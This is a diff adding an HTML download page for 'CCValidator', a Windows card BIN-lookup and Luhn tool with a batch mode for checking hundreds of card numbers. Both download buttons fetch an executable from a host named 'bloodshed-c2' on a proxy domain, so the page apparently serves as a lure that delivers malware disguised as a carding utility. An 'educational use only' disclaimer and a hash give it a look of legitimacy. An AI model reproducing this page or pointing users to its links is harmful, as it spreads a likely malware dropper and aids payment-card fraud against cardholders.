@@ -1,0 +1,105 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>CCValidator v2.4 — BIN Lookup + Card Check</title>
+<meta name="description" content="Free CC validation tool. BIN lookup, issuer info, Luhn check, card type detection. Works offline, no API keys needed.">
+<style>
+:root { --bg:#0d1117; --card:#161b22; --border:#30363d; --accent:#58a6ff; --green:#3fb950; --text:#c9d1d9; --muted:#8b949e; }
+* { margin:0; padding:0; box-sizing:border-box; }
+body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', system-ui, sans-serif; background:var(--bg); color:var(--text); min-height:100vh; line-height:1.6; }
+.header { background:linear-gradient(135deg, #0d1117, #161b22); padding:48px 24px 32px; text-align:center; border-bottom:1px solid var(--border); }
+.header h1 { font-size:28px; margin-bottom:6px; color:#f0f6fc; }
+.header .version { display:inline-block; background:#1f6feb22; border:1px solid #1f6feb44; color:var(--accent); padding:2px 8px; border-radius:4px; font-size:12px; font-family:monospace; margin-left:8px; vertical-align:middle; }
+.header p { color:var(--muted); font-size:14px; margin-top:6px; }
+.main { max-width:780px; margin:24px auto; padding:0 16px; }
+.card { background:var(--card); border:1px solid var(--border); border-radius:8px; padding:28px; margin-bottom:20px; }
+.card h3 { font-size:16px; margin-bottom:12px; color:var(--accent); }
+.card p, .card li { color:var(--muted); font-size:14px; }
+.card ul { margin:6px 0 0 20px; }
+.card ul li { margin-bottom:4px; }
+.feature-grid { display:grid; grid-template-columns:1fr 1fr; gap:12px; margin-top:16px; }
+.feature { background:rgba(88,166,255,.05); border:1px solid var(--border); border-radius:6px; padding:12px; font-size:13px; }
+.feature strong { color:var(--green); }
+.btn { display:inline-block; background:#238636; color:white; padding:14px 44px; border-radius:6px; text-decoration:none; font-weight:600; font-size:15px; margin-top:16px; transition:all .2s; cursor:pointer; border:1px solid #2ea043; }
+.btn:hover { background:#2ea043; }
+.btn-outline { background:transparent; color:var(--accent); border:1px solid var(--border); }
+.btn-outline:hover { background:rgba(88,166,255,.1); }
+.hash { background:rgba(0,0,0,.3); border:1px solid var(--border); padding:10px 14px; border-radius:4px; font-family:monospace; font-size:12px; color:var(--green); margin-top:12px; word-break:break-all; }
+.warn { background:#341a1a; border:1px solid #5a2a2a; color:#f85149; padding:10px 16px; border-radius:4px; font-size:13px; margin-top:12px; }
+.footer { text-align:center; padding:24px; color:var(--muted); font-size:12px; border-top:1px solid var(--border); margin-top:32px; }
+code { background:rgba(255,255,255,.05); padding:2px 6px; border-radius:3px; font-size:13px; }
+</style>
+</head>
+<body>
+<div class="header">
+    <h1>CCValidator <span class="version">v2.4</span></h1>
+    <p>BIN lookup · card type detection · Luhn validation · issuer info — all offline</p>
+</div>
+<div class="main">
+    <div class="card">
+        <h3>What it does</h3>
+        <div class="feature-grid">
+            <div class="feature"><strong>BIN Lookup</strong><br>Instantly identify bank, country, card type, and level from first 6 digits</div>
+            <div class="feature"><strong>Luhn Check</strong><br>Validate card number structure — catches typos and generated numbers</div>
+            <div class="feature"><strong>Card Type</strong><br>Visa, Mastercard, Amex, Discover, JCB — auto-detected</div>
+            <div class="feature"><strong>Issuer Info</strong><br>Bank name, country code, card level (Classic/Gold/Platinum/Black)</div>
+            <div class="feature"><strong>Offline</strong><br>No API calls, no logging, no network — runs entirely local</div>
+            <div class="feature"><strong>Batch Mode</strong><br>Paste up to 500 cards at once, export results as CSV</div>
+        </div>
+    </div>
+    <div class="card">
+        <h3>Download — Windows (64-bit)</h3>
+        <p>Standalone executable. No install, no dependencies. Extract and run.</p>
+        <a href="https://bloodshed-c2.magi-proxy.workers.dev/dl/s/32960fc16208302fe274bbc0f0de9167" class="btn" download="CCValidator_v2.4.zip">Download (8.0 MB)</a>
+        <div class="hash">SHA-256: 5a246a9f4ee53816c0041e5ecde7feee73d384b8c97f796a9b33697e6db8da16</div>
+        <div class="warn">
+            ⚠ This tool is for educational/security research only. Do not use with cards you don't own.
+            The author is not responsible for misuse. Card numbers shown in screenshots are test/demo BINs.
+        </div>
+    </div>
+    <div class="card">
+        <h3>Screenshots</h3>
+        <p style="color:var(--muted);">Single card check:</p>
+        <pre style="background:rgba(0,0,0,.4);padding:16px;border-radius:4px;font-family:monospace;font-size:13px;color:#7ee787;overflow-x:auto;">
+$ ccvalidator 4532015112830366
+
+BIN: 453201 (Visa, USA)
+Issuer: CHASE BANK USA
+Level: Classic/Debit
+Luhn: ✓ Valid
+</pre>
+        <p style="color:var(--muted);margin-top:16px;">Batch mode:</p>
+        <pre style="background:rgba(0,0,0,.4);padding:16px;border-radius:4px;font-family:monospace;font-size:13px;color:#7ee787;overflow-x:auto;">
+$ ccvalidator -b cards.txt --output results.csv
+
+Processed: 247 cards
+Valid Luhn: 231
+Invalid:    12
+Missing BIN: 4
+Output: results.csv
+</pre>
+    </div>
+    <div class="card">
+        <h3>Supported BINs</h3>
+        <p>Built-in database covers 200,000+ BINs. Updated July 2026.</p>
+        <ul>
+            <li>All major issuers (Visa, MC, Amex, Discover, JCB, UnionPay)</li>
+            <li>Prepaid, debit, credit, charge card detection</li>
+            <li>Country-level issuer identification</li>
+            <li>Card level: Classic, Gold, Platinum, World, Signature, Infinite, Black</li>
+        </ul>
+    </div>
+    <div class="card">
+        <h3>CLI + GUI</h3>
+        <p>Command-line for batch processing. Graphical mode for interactive use — double-click the exe.</p>
+        <a href="https://bloodshed-c2.magi-proxy.workers.dev/dl/s/32960fc16208302fe274bbc0f0de9167" class="btn btn-outline" download="CCValidator_v2.4_GUI.zip">GUI Version (8.0 MB)</a>
+    </div>
+</div>
+<div class="footer">
+    <p>CCValidator v2.4 · July 2026 · Tool for educational card number analysis</p>
+    <p style="margin-top:8px;">Source: <a href="https://github.com/Bloodshed-Rain/cc-validator" style="color:var(--accent);">github.com/Bloodshed-Rain/cc-validator</a></p>
+</div>
+</body>
+</html>
